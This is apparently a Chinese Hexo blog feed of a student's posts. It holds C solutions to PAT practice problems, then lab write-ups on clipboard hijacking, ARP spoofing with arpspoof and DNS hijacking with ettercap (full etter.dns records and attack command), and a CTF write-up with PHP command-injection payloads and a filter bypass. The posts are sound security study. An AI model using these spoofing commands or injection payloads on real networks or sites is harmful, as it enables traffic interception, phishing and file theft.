class="keyword">char</span> *str1,<span class="keyword">char</span> *str2,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(str1)&gt;=<span class="built_in">strlen</span>(str2))</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(str1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n+<span class="number">1</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(((<span class="built_in">isdigit</span>(str1[i]) &amp;&amp; <span class="built_in">isdigit</span>(str2[i]))||((str1[i]&gt;=<span class="number">65</span> &amp;&amp; str1[i]&lt;=<span class="number">78</span>) &amp;&amp; (str2[i]&gt;=<span class="number">65</span> &amp;&amp; str2[i]&lt;=<span class="number">78</span>))) &amp;&amp; str1[i]==str2[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> str1[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getCh3</span><span class="params">(<span class="keyword">char</span> *str1,<span class="keyword">char</span> *str2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(str1)&gt;=<span class="built_in">strlen</span>(str2))</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(str1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isalpha</span>(str1[i]) &amp;&amp; <span class="built_in">isalpha</span>(str2[i]) &amp;&amp; str1[i]==str2[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1015-德才论"><a href="#1015-德才论" class="headerlink" title="1015 德才论"></a>1015 德才论</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> de;</span><br><span class="line">    <span class="keyword">int</span> cai;</span><br><span class="line">&#125; student;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(student *st,<span class="keyword">int</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N,L,H;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;N,&amp;L,&amp;H);</span><br><span class="line">    student stu[N];</span><br><span class="line">    student class1[N];</span><br><span class="line">    student class2[N];</span><br><span class="line">    student class3[N];</span><br><span class="line">    student class4[N];</span><br><span class="line">    <span class="keyword">int</span> index1=<span class="number">0</span>,index2=<span class="number">0</span>,index3=<span class="number">0</span>,index4=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;stu[i].num,&amp;stu[i].de,&amp;stu[i].cai);</span><br><span class="line">        <span class="keyword">if</span>(stu[i].de&gt;=H &amp;&amp; stu[i].cai&gt;=H)</span><br><span class="line">        &#123;</span><br><span class="line">            class1[index1] = stu[i];</span><br><span class="line">            index1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(stu[i].de&gt;=H &amp;&amp; stu[i].cai&lt;H &amp;&amp; stu[i].cai&gt;=L)</span><br><span class="line">        &#123;</span><br><span class="line">            class2[index2] = stu[i];</span><br><span class="line">            index2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(stu[i].de&lt;H &amp;&amp; stu[i].de&gt;=stu[i].cai &amp;&amp; stu[i].cai&gt;=L)</span><br><span class="line">        &#123;</span><br><span class="line">            class3[index3] = stu[i];</span><br><span class="line">            index3++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(stu[i].cai&gt;=L &amp;&amp; stu[i].de&gt;=L)</span><br><span class="line">        &#123;</span><br><span class="line">            class4[index4] = stu[i];</span><br><span class="line">            index4++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(class1,index1);</span><br><span class="line">    sort(class2,index2);</span><br><span class="line">    sort(class3,index3);</span><br><span class="line">    sort(class4,index4);</span><br><span class="line">    <span class="keyword">int</span> M=index1+index2+index3+index4;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,M);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=index1<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,class1[i].num,class1[i].de,class1[i].cai);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=index2<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,class2[i].num,class2[i].de,class2[i].cai);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=index3<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,class3[i].num,class3[i].de,class3[i].cai);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=index4<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d %d\n"</span>,class4[i].num,class4[i].de,class4[i].cai);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(student *st,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    student tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j &lt; len-i<span class="number">-1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(st[j].de + st[j].cai &gt; st[j+<span class="number">1</span>].de + st[j+<span class="number">1</span>].cai)</span><br><span class="line">            &#123;</span><br><span class="line">                tmp = st[j+<span class="number">1</span>];</span><br><span class="line">                st[j+<span class="number">1</span>] = st[j];</span><br><span class="line">                st[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(st[j].de + st[j].cai == st[j+<span class="number">1</span>].de + st[j+<span class="number">1</span>].cai)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(st[j].de&gt;st[j+<span class="number">1</span>].de)</span><br><span class="line">                &#123;</span><br><span class="line">                    tmp = st[j+<span class="number">1</span>];</span><br><span class="line">                    st[j+<span class="number">1</span>] = st[j];</span><br><span class="line">                    st[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(st[j].de == st[j+<span class="number">1</span>].de)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(st[j].num &lt; st[j].num)</span><br><span class="line">                    &#123;</span><br><span class="line">                        tmp = st[j+<span class="number">1</span>];</span><br><span class="line">                        st[j+<span class="number">1</span>] = st[j];</span><br><span class="line">                        st[j] = tmp;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1016-部分A-B"><a href="#1016-部分A-B" class="headerlink" title="1016 部分A+B"></a>1016 部分A+B</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">powNum</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">10</span>],b[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> da,db;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s %c %s %c"</span>,a,&amp;da,b,&amp;db);</span><br><span class="line">    <span class="keyword">int</span> count1=<span class="number">0</span>,count2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> res1=<span class="number">0</span>,res2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> t1 = da<span class="number">-48</span>;</span><br><span class="line">    <span class="keyword">int</span> t2 = db<span class="number">-48</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(a);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]==da)</span><br><span class="line">        &#123;</span><br><span class="line">            count1++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(b);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b[i]==db)</span><br><span class="line">        &#123;</span><br><span class="line">            count2++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;count1;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res1+=t1*powNum(<span class="number">10</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;count2;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res2+=t2*powNum(<span class="number">10</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,res1+res2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">powNum</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res *= n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>剪切板劫持</title>
    <url>/post/5989b0e5.html</url>
    <content><![CDATA[<p>最近一直在康高数，今天下午做题时感觉直接被按在地上摩擦，就想着去放空一下大脑(划一会儿水)。然后就去逛了下某网站，发现了个有趣的东西-剪切板劫持，看完这我再也不说自己精通CV大法了(wtcl,wuwuwu~)。大致攻击流程是用户在网页中复制文本时，触发了脚本，该脚本修改了剪切板的内容，如果不注意所复制的内容，很容易造成恶意代码执行，下面就举个小栗子来说明吧。<br>页面展示内容如下<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CV/1.jpg" alt=""><br>对文本进行复制，然后将复制的内容粘贴进命令行<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CV/3.jpg" alt=""><br>看似和网页上展示的一样，其实已经执行了恶意代码<br>可以查看源码进一步了解<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CV/2.jpg" alt=""><br>可以发现剪切板的内容被替换了，再看命令是否执行了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/CV/4.jpg" alt=""><br>显然已经执行成功了<br>这里在替换的命令中使用换行符，从而在粘贴进命令行时直接快速执行，一闪而过，正常情况下大都不会注意到这一点<br>平时在网上找教程时，直接疯狂CV的方式也是存在一定的风险的，害</p>
]]></content>
  </entry>
  <entry>
    <title>ARP欺骗</title>
    <url>/post/808383bb.html</url>
    <content><![CDATA[<p>最近计算机网络课刚好学到了ARP协议，就借此机会初步探究一下ARP欺骗<br>在实验之前先了解一下ARP相关知识</p>
<h3 id="0x00-什么是ARP协议"><a href="#0x00-什么是ARP协议" class="headerlink" title="0x00 什么是ARP协议"></a>0x00 什么是ARP协议</h3><p>&emsp;&emsp;ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p>
<h3 id="0x01-ARP通信过程"><a href="#0x01-ARP通信过程" class="headerlink" title="0x01 ARP通信过程"></a>0x01 ARP通信过程</h3><p>&emsp;&emsp;每台主机都会在自己的ARP高速缓存中建立一个映射表(生存时间10-20分钟)，用于表示IP地址到MAC地址的映射关系。<br>&emsp;&emsp;PC1想要和PC2通信，首先PC1会去自己的映射表中查询PC2的MAC地址，如果没查到，PC1就会在本局域网上广播发送一个ARP请求分组，分组主要内容为：我的IP地址是192.168.0.100,MAC地址是00-00-C0-15-AD-18,我想知道IP地址为192.168.0.101的主机(PC2)的MAC地址。<br>&emsp;&emsp;在本局域网上的所有主机都会收到该ARP请求分组，别的主机发现请求分组中要查询的IP和自己IP不一致，就会将该分组扔掉，当PC2发现请求分组中要查询的IP和自己一致时，就会收下该请求分组，并向PC1发送ARP响应分组，响应分组主要内容为：我的IP地址是192.168.0.101,MAC地址是08-00-2B-00-EE-0A。此处应注意，响应分组是单播，只会发给PC1，其它主机并不会接收到该分组。<br>PC1收到PC2的响应分组后，就会在其ARP高速缓存中写入PC2的IP地址到MAC地址的映射。</p>
<h3 id="0x02-ARP协议安全漏洞"><a href="#0x02-ARP协议安全漏洞" class="headerlink" title="0x02 ARP协议安全漏洞"></a>0x02 ARP协议安全漏洞</h3><p>&emsp;&emsp;ARP欺骗的根源在于ARP应答处理机制，在ARP协议中规定，对于任何ARP应答都给予信任，没有主动被动确认机制（主动ARP指的是在主动发送ARP请求后在指定时间内收到ARP应答，在请求指定时间外学习的ARP应答都是被动的），因此为伪造ARP应答提供了可乘之机。欺骗者通过轮询各IP地址和MAC地址对应关系并无违规之处，协议规定了对于ARP请求要给予应答。<br>&emsp;&emsp;PC和网关被欺骗的直接根源在于被动学习了伪造的ARP应答，如何避免学习伪造ARP应答称为防止ARP欺骗的核心内容。<br>&emsp;&emsp;欺骗是分别针对网关和PC的，因为上网是双向流量，网关被欺骗下行数据无法发给PC，PC被欺骗上行数据无法发给网关，所以都会上不了网，上只有同时解决网关被欺骗和PC被欺骗，上网才能正常，有不少人误以为只在网关上防止就可以了，这是错误的。还很多时候有人采取重启网关的方式恢复上网，这是因为断电重启后PC、网关都要重新主动学习一次，主动学习是可以学习到正确的映射关系的，所以重启后上网恢复正常，但很有可能过了一段时间后又无法上网了，将网关断电并不是好解决方案。</p>
<h3 id="0x03-ARP欺骗攻击原理"><a href="#0x03-ARP欺骗攻击原理" class="headerlink" title="0x03 ARP欺骗攻击原理"></a>0x03 ARP欺骗攻击原理</h3><p>&emsp;&emsp;这里只研究对PC2进行欺骗，并不对网关进行欺骗，即并不是中间人攻击，此处要达到的效果就是将PC2本来要发给网关的分组发给了攻击机PC1，然后PC1并不会将该分组转给网关，PC1会直接扔掉分组，即PC2不会收到请求的响应，表现为网络中断。</p>
<p>&emsp;&emsp;利用ARP协议的安全漏洞，假设PC1是一台攻击机，当我们知道了受害者PC2的局域网IP地址后，冒充网关(IP:192.168.0.1)，给它发送一个响应分组(并不需要PC2的请求)，其中主要内容为：我的IP地址是192.168.0.1,MAC地址是08-00-2B-00-EE-0A。当PC2收到了该分组，PC2就会将分组中的映射关系更新到自己的映射表中，当PC2想和网关通信时，就会将分组发给PC1,但并不会收到响应，就会出现网络中断。</p>
<h3 id="0x04-ARP模拟攻击"><a href="#0x04-ARP模拟攻击" class="headerlink" title="0x04 ARP模拟攻击"></a>0x04 ARP模拟攻击</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>攻击机PC1：kali  ,  IP为192.168.0.101<br>受害者PC2：Windows10,  IP为192.168.0.105<br>网关：IP为192.168.0.1<br>工具：arpspoof</p>
<p>在ARP欺骗前查看一下受害者的映射表<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/1.jpg" alt=""><br>此时关于网关的映射为192.168.0.1——&gt;c8-3a-35-5d-16-60<br>关于攻击机的映射为192.168.0.101——&gt;00-0c-29-1f-3c-ab</p>
<p>测试网络情况<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/6.jpg" alt=""></p>
<h4 id="kali进行攻击"><a href="#kali进行攻击" class="headerlink" title="kali进行攻击"></a>kali进行攻击</h4><p>查看局域网主机存活情况<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/2.jpg" alt=""><br>可以看到PC2在线，开始攻击<br>-i指定网卡，-t指定目标主机的IP和网关IP,即截获目标主机发给网关的数据包。<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/4.jpg" alt=""><br>查看PC2的映射表<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/3.jpg" alt=""><br>网关的MAC地址已经被修改为攻击机的MAC地址，显然已经攻击成功</p>
<p>再次测试网络情况<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/5.jpg" alt=""></p>
<p>停止攻击等待一段时间后，查询受害者的映射表<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/ARP/7.jpg" alt=""><br>映射表恢复正常，网络正常</p>
<h3 id="0x05-ARP攻击防御"><a href="#0x05-ARP攻击防御" class="headerlink" title="0x05 ARP攻击防御"></a>0x05 ARP攻击防御</h3><h4 id="网关防御"><a href="#网关防御" class="headerlink" title="网关防御"></a>网关防御</h4><p>&emsp;&emsp;授权ARP，授权ARP的原理是摒弃ARP，而是通过DHCP方式来学习各个IP地址和MAC地址的映射关系，端口启动授权ARP后，ARP学习功能自动关闭。其优点是部署方便，只要网关LAN口启动DHCP服务和授权ARP即可，缺点是所有内网PC必须采用DHCP方式获取地址，否则无法上网，对于地址静态设置的内部服务器就不方便了。<br>&emsp;&emsp;静态ARP，先通过主动请求或者手动检查每一台PC的IP、MAC地址的映射，即获得一份正确的映射列表，然后通过命令在网关中逐一添加表项，如果收集完整可以在LAN口中关闭ARP学习功能，达到更好效果。优点是可以支持内部PC手工配置地址如内部服务器，缺点也是很明显的，收集工作比较繁杂（华三网关支持自主扫描功能可以简化该工作），PC地址修改后表项失效（因此无法支持DHCP模式），新增加PC后需要添加新的表项。</p>
<h4 id="PC防御"><a href="#PC防御" class="headerlink" title="PC防御"></a>PC防御</h4><p>&emsp;&emsp;PC的任务是访问一些常用地址，如网关，内部服务器，那么PC上也配置这些常用地址的静态ARR就能防止平常上网服务中断，PC有一个缺点是配置静态ARP后无法保存，重启后需要重新配置。注：window PC通过命令行中arp –s 192.168.0.1 00-01-00-01-00-01方式进行静态绑定。<br><img src="https://gitee.com/zxfireworks/test/raw/master/Pic/1.png" alt=""></p>
]]></content>
      <categories>
        <category>局域网安全</category>
      </categories>
  </entry>
  <entry>
    <title>DNS劫持</title>
    <url>/post/cc0e11b5.html</url>
    <content><![CDATA[<p>&emsp;&emsp;DNS(Domain Name Server，域名服务器)是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名和与之相对应的IP地址的表，以解析消息的域名。<br>&emsp;&emsp;当我们在通过网址访问网站时，并不是根据网址中的域名来寻找要请求的服务器，而是会将域名解析为IP地址，根据IP地址来寻找对应服务器。</p>
<h3 id="0x00-访问网站流程"><a href="#0x00-访问网站流程" class="headerlink" title="0x00 访问网站流程"></a>0x00 访问网站流程</h3><p>&emsp;&emsp;在浏览器地址栏输入一个网址时，计算机就会带着该网址中的域名部分去本地计算机的hosts文件中查询该域名对应的IP,如果找到了，则直接访问该IP,如果没找到，则进一步去远程的DNS服务器上找对应域名的IP,找到后访问该IP.</p>
<h3 id="0x01-DNS劫持原理"><a href="#0x01-DNS劫持原理" class="headerlink" title="0x01 DNS劫持原理"></a>0x01 DNS劫持原理</h3><p>&emsp;&emsp;攻击者控制了你的网关或者冒充了你的网关(路由器、交换机、ISP),即先进行了ARP欺骗。当你发送了一个查找域名的IP的请求时，被攻击者拦截，并且返回给你了一个攻击者指定网站的IP,你的浏览器机会把这个IP当作你请求的域名的IP,这时你看到的页面就是攻击者想让你看到的那个页面，常用于钓鱼网站。</p>
<h3 id="0x02-DNS劫持实验"><a href="#0x02-DNS劫持实验" class="headerlink" title="0x02 DNS劫持实验"></a>0x02 DNS劫持实验</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>攻击机：kali    IP地址：192.168.0.108<br>受害机：Windows10 IP地址：192.168.0.109<br>服务器：Windows+Phpstudy搭建测试网站 IP地址：192.168.0.101<br>网关：192.168.0.1<br>工具：Ettercap</p>
<p>攻击前ping百度<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/DNS/1.jpg" alt=""><br>在kali中起一个Apache服务作为钓鱼网站<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure></p>
<h4 id="kali进行攻击"><a href="#kali进行攻击" class="headerlink" title="kali进行攻击"></a>kali进行攻击</h4><p>修改Etter配置文件，设置所有域名都解析到钓鱼网站的IP<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><br>将文件中的其余内容全部注释，然后增加以下两条记录<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*   A       192.168.0.101</span><br><span class="line">*   PTR     192.168.0.101</span><br></pre></td></tr></table></figure><br>发起攻击<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.0.109// /192.168.0.1//</span><br></pre></td></tr></table></figure><br>受害者访问新浪网<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/DNS/3.jpg" alt=""><br>受害者ping百度<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/DNS/2.jpg" alt=""><br>攻击成功，实验到此结束</p>
<h3 id="0x03-DNS劫持防御"><a href="#0x03-DNS劫持防御" class="headerlink" title="0x03 DNS劫持防御"></a>0x03 DNS劫持防御</h3><p>尽量使用公共DNS服务器<br>定期检查DN设置是否已修改<br>使用复杂的密码重置路由器的默认密码，即不要使用弱口令<br>使用DNS注册器时使用双因素身份验证，及时修补路由器漏洞<br>远离不受信任的网站，避免在此类网站上下载文件<br>如果已被感染，建议删除HOSTS文件的内容并重置Hosts文件</p>
]]></content>
      <categories>
        <category>局域网安全</category>
      </categories>
  </entry>
  <entry>
    <title>强网杯S4-Web</title>
    <url>/post/e3e6e8fc.html</url>
    <content><![CDATA[<p>简单记录一下几道web题</p>
<h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><p>给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>get方式传一个参数ip,且过滤了flag,看见system，首先想到命令执行，先ls一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/QWB-S4/qwb0.jpg" alt=""><br>发现flag.php，cat一下，但是这里过滤了flag,用斜线绕过即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat%20fla\g.php</span><br></pre></td></tr></table></figure><br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/QWB-S4/qwb1.jpg" alt=""><br>在源码中发现flag<br>后来看大师傅的wp,这里还可以使用通配符来绕过过滤,真的是学到了<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1|cat%20fla*</span><br></pre></td></tr></table></figure></p>
<h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line">highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != hash(<span class="string">"md4"</span>, $_GET[<span class="string">"hash1"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 1 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'hash2'</span>] === $_GET[<span class="string">'hash3'</span>] || md5($_GET[<span class="string">'hash2'</span>]) !== md5($_GET[<span class="string">'hash3'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'level 2 failed'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">"SELECT * FROM flag WHERE password = '"</span> . md5($_GET[<span class="string">"hash4"</span>],<span class="keyword">true</span>) . <span class="string">"'"</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
